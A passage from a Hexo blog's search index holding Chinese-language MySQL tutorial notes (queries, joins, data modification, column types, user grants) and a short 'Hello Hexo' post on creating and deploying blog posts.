group by pinpai having 数量 &gt; 2; //和上面的一样 order by排序子句 对查询结果进行排序 用法：1order by 字段名 [ [asc|desc] , 字段名[asc|desc] ,……]; 按照字段名进行顺序或倒序排序，多个字段名时，先按照第一个字段名排序，再按照第二个字段名进行排序…… limit 子句用法：123limit [offset,]n offset:偏移量(跳过几行) n取出的条目 offset省略相当于 limit 0,n DISTINCT关键字合并查询记过重复行合并查询字段结果的重复的行1SELECT DISTINCT mobile, nationality FROM `person`; 子查询就是通过把查询语句的值作为条件进行查询的 子查询方便，但是性能原因略低，一般也会回用，省略 执行子查询时，MYSQL需要创建临时表，查询完毕后再删除这些临时表，所以，子查询的速度会受到一定的影响，这里多了一个创建和销毁临时表的过程。 union 子查询 合并两个查询的结果 用法：12345select 语句1union [distinct | all ]select语句2[order by 子句][limit 子句] ; 说明： distinct | all用于设定是否消除重复行，默认不写就是distinct，表示会消除重复行； order by子句和limit子句，是对整个联合之后的数据结果进行排序和数量限定； 这两个select语句，要求字段数量必须一致，对应字段类型最好一致； 联合查询的结果数据中，字段名以第一个select语句中的字段名为准； 第一个select语句中的字段名如果有别名，则后续的order by子句就必须使用该别名； 将两个“字段一致”的查询语句所查询到的结果以“纵向堆叠”的方式合并到一起，成为一个新的结果集。结果集的行数是两个独立select查询语句的结果行数的和例子：12 连表查询用法：1select XX1, XX2, .... from 表1 [连接方式] join 表2 [ on 连接条件] where ... 常用的两个连表查询 内连接 inner join1from 表1 inner join 表2 on 表1.字段1 = 表2.字段2 结果：是在交叉连接的结果(两表之间做全相乘的结果)中筛选出符合 on 后面条件的也是左连接和右连接的交集 左(外)连接 left [outer] join1from 表1 left [outer] join 表2 on 表1.字段1 = 表2.字段2 假设A表在左，不动。B表在A表的右侧滑动，A表和B表通过一个关系(条件)来筛选B表的行，如果符合条件，则B表取出对应的行与A表对应的行组成新的一行数据，添加到结果集中，形成的结果集可以看成一张表，设为C，形成的结果集(表c)最少的行数为左边表(表A)的行数。也可以理解为 内连接的结果添加上没有匹配上的表A的没有匹配上数据的行(右边部分填充null)此时，可以对C表进行查询操作，where ，group，having，order by，limit依旧可以使用 视图和将查询出来的数据存放到一张新表里一样，不常用。略 增1234567891011形式1：常用insert [into] 表名 [(字段1,2,3，……)] values (值1,2,3，……)[,(2值1,2,3，……),……]; //插入多行时用逗号分开形式2：replace [into] 表名[(字段1,2,……)] values (值1,2,3，……)[,(2值1,2,3，……),……]; //和insert的区别是插入的数据的主键值在表中已存在时插入的将会替换这行数据，而insert将执行失败形式3：insert [into] 表名 [(字段1,2,3，……)] select 字段1,字段2,……from 其他表表名; //插入select中查询到的数据形式4：insert [into] 表名 字段1=值表达式,字段2=值表达式,字段3=值表达式，……;形式5：load data 导入数据 加载数据文件 load data infile '完整的数据文件路径.文件格式后缀' into table 表名;可以在txt中创建，数据与数据之间需要用tab进行隔开 ，注意需要使用utf-8格式的，还有与表的字段定义的类型保持一致(数据不用加引号)，路径中的\可以用/也可以进行转义\\使用 插入数据1234INSERT INTO myisam_1 VALUES (23, '李牧');INSERT INTO myisam_1 VALUES (12, '王翦');INSERT INTO myisam_1 VALUES (34, '廉颇');INSERT INTO myisam_1 VALUES (15, '白起'); 删1234delete from 表名 [where 属性=值(筛选条件)] [order by 排序设定] [limit 数量限定]; 1.where 几乎必须，如果省略将删除所有数据2.order by 排序设定用于设定删除这些数据的时候指定的字段的顺序来删除，3.limit 用于删除数据的时候指定只删除“前面的多少行” 改12update 表名 set 字段1=新值,字段2=新值,…… [where 属性=值(筛选条件)] [order by 排序设定] [limit 数量限定];和删的用法相似 列类型整数类型 名称 字节 最小值(带符号／不带符号) 最大值(带符号／不带符号) tinyint 1 -128/0 127/255 smallint 2 -32768/0 …… mediumint 3 -8388608/0 …… int 4 -2147483648/0 …… bigint 8 -9223372036854775808/0 …… 1字节(byte)有8位(bit),当显示负数的时候需要占用首位进行表示，所以表示数值的只有7位 使用形式 类型名 [M(长度)] [unsigned] [zerofill] 其中M表示“显示长度”，其需与zerofill结合使用才有效，即不够该长度的会自动左侧补0，当然如果超出也不影响。长度，就是用来设定要显示的长度位数(数字个数) unsigned表示“无符号数”，表示其中的数值是“非负”数字 如果设置了zerofill，则自动也就表示同时具备了unsigned修饰 如果设置了zerofill但没有设定长度M，则其会默认将所有数的左边补0到该类型的最大位数 小数类型 类型 名称 字节 精度 浮点型 单精度 float(m,d) 4 6-7位 双精度 double(m,d) 8 15位 定点型 decimal(m,d) 如果M&gt;D，为M+2否则为D+2 总精度65位/小数部分精度30位 m叫“精度”，代表“总位数”， d表示“标度”，代表小数位浮点型的小数，内部是二进制形式，所以很可能是非精确的，基本多有语言都有的毛病 字符串类型 类型 大小(字节) 用途 CHAR 0-255(字符) 固定长度 VARCHAR 0-65535 变化长度 TEXT 0-65535 长文本数据 enum 最多65535选项 单选类型 set 最多64选项 多选类型 char(m)类型:定长字符串，m表示设定的字符长度，存储内容和编码格式无关，其存储的时候，就是该长度——不够就会自动补空格填满；最大可设定为255，表示可存储255个 字符； varchar(m)类型：变长字符串，m表示设定的字节数长度，存储内容和编码格式有关，是可存储的最大长度，实际存储长度可以小于该长度；该类型存储的时候，还需要在字段内的最前面额外存储该字段的实际长度；最大可设定为65533，表示最大可存储65533个 字节；因为考虑因素：一行 的总的存储空间限制是65535 字节，但有考虑字符编码的问题，又会出现：如果存储的是纯英文字符，则实际最多可存储65533个字符；如果存储的是纯gbk的中文字符，则实际最多可存储的是65533/2个字符；如果存储的是纯utf8的中文字符，则实际最多可存储的是65533/3个字符； text类型：它通常用于存储“大文本”，因为其可存储65535个字节，并且， 不受行存储空间的限制；不能设置默认值 varchar和text存储结构上是有区别的，text是单独存储的，不受行存储空间限制;对于大文本的字段最好分拆成单独一个表从存储上来讲大于255的varchar可以说是转换成了text.这也是为什么varchar大于65535了会转成mediumtext 字段的额外开销 varchar 小于255byte 1byte overhead varchar 大于255byte 2byte overhead tinytext 0-255 1 byte overhead text 0-65535 byte 2 byte overhead mediumtext 0-16M 3 byte overhead longtext 0-4Gb 4byte overhead 备注 overhead是指需要几个字节用于记录该字段的实际长度。在固定的长度下 char 类型比 varchar 占用空间更少，并且由于 char 是固定长度，所以更利于搜索速度 . enum类型：用于存储若干个“可选项之一”的一种字符类型。通常，是在字段定义时，预先设定多个选项，而且是作为单选项，实际存储数据的时候，就可以选择其中一个存入数据库。它适合于存储在网页中的“单选项”数据，比如：单选按钮，下拉列表选项值等等；形式：enum(‘单选项1’, ‘单选项2’, ‘单选项3’, ……. ); //最多65535个。说明：这些选项，在系统内部，实际对应的是如下这些数字值：1, 2, 3, 4, 5, 6, …. set类型：用于存储若干个“多选项”的一种字符类型。通常，是在字段定义时，预先设定多个选项，而且是作为多选项，实际存储数据的时候，就可以选择其中若干个选项值存入数据库。它适合于存储在网页中的“多选项”数据，比如：多选按钮；形式：set(‘多选项1’, ‘多选项2’, ‘多选项3’, ……. ); //最多64个。说明：这些选项，在系统内部，实际对应的是如下这些数字值：1, 2, 4, 8, 16, …. 3表示选择类1和2 时间类型 类型 大小(字节) 范围 DATE 3 1000-01-01/9999-12-31 TIME 3 -838:59:59/838:59:59 YEAR 1 1901/2155 DATETIME 8 1000-01-01 00:00:00/9999-12-31 23:59:59 TIMESTAMP 8 1970-01-01 00:00:00/2037 年某时 timestamp和datetime基本相似timestamp额外特性：用于记录一个“当前时间”的精确的时间戳——也就是某个时刻的对应整数值；该整数值，表示，从1970年1月1日0时0分0秒开始算起到该时候所经历的秒数；而且，其有如下特征：该字段的值，会在一个表的某行数据执行insert或update的时候，自动获取该时刻的时间戳值；显示格式 YYYY-MM-DD HH:MM:SS特性:不用赋值,该列会为自己赋当前的具体时间 ，但是要添加not null属性1`update_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间', //默认值为插入的时间 更新数据时也自动更新为当前时间 注意：作为时间日期类型的数据，如果是在代码中插入一个具体的字面数据值，则需要用单引号引起来——跟字符类型一样。 用户管理添加用户mysql中的用户数据，都存储在mysql的系统数据库“mysql”中的user表中1create user ‘用户名’@’允许登录的网络位置’ identified by ‘密码’; “允许登录的网络位置”表示，该用户，在输入正确的用户名和密码的同时，也必须在“指定”的位置来登录该服务器。位置就是网络地址，通常是ip地址；其中，localhost表示只允许在本机（本地）登录。如果想远程登录的话，将”localhost”改为”%”，表示在任何一台电脑上都可以登录。也可以指定某台机器可以远程登录。 添加权限1grant 权限名1，权限名2，.... on 某库．某下级单位 to ‘用户名’@’允许登录的网络位置’ identified by ‘密码’ 说明： 权限名，就是上述那些单词或单词组合，比如：select，insert，delete，等等； 某下级单位，指的是，一个数据库中的下级可操作对象，比如表，视图， 2.1 举例：shuangyuan.join1, 或者shuangyuan.tab1, mysql.user 2.2 特例1：*.*表示整个系统中的所有数据库的所有下级单位； 2.3 特例2：某库名.*，表示该指定数据库的所有下级单位； identified 用于给现有的该用户改密码。如果不改密码，就可以不写； 该grant语句，还可以给“不存在的用户”进行授权，此时实际上，会同时创建该用户。如果是这种情况，则此时，identified部分就不可以省略，而是必须给出密码； 例子：1grant select,insert on test.test to 'test'@'localhost'; 权限列表： 取消权限1revoke 权限名1，权限名2，.... on 某库．某下级单位 from ‘用户名’@’允许登录的网络位置’]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello Hexo]]></title>
    <url>%2F2017%2F06%2F29%2FHello-hexo%2F</url>
    <content type="text"><![CDATA[文章md头部设置 123456789---title: test #标题名称date: 2017-06-29 11:56:02 #时间tags: #创建标签 - Testing #标签名称 - begin #标签名称categories: hello hexo #分类--- 添加图片 123456在source下创建images文件夹。![&apos;tupian&apos;](/images/my.jpg) images 是source下的文件夹也可以吧图片放在七牛进行引用。 使用 进入到目录没有权限的加 sudo 1/Users/echo-ding/Documents/ding/www/github-blog 创建文章1hexo new &quot;My New Post&quot; #my new post 为文章名 也可以直接在source中创建md文档 启动服务1hexo server 生成文件(md转成html)1hexo generate 推送到远端1hexo deploy 写博客 写完之后直接。生成文件(md转成html)1hexo generate 推送到远端1hexo deploy 本地测试(s 就是 server的缩写) 12hexo s --debug #默认以4000端口启动sudo hexo s --debug -p 80 #以80端口启动 代码高亮 在代码块开头后添加php表示php代码，用来高亮显示。 12345678class ClassName extends AnotherClass&#123; public function FunctionName($value='') &#123; echo "string"; &#125;&#125;]]></content>
      <categories>
        <category>hello world</category>
      </categories>
      <tags>
        <tag>begin</tag>
      </tags>
  </entry>
</search>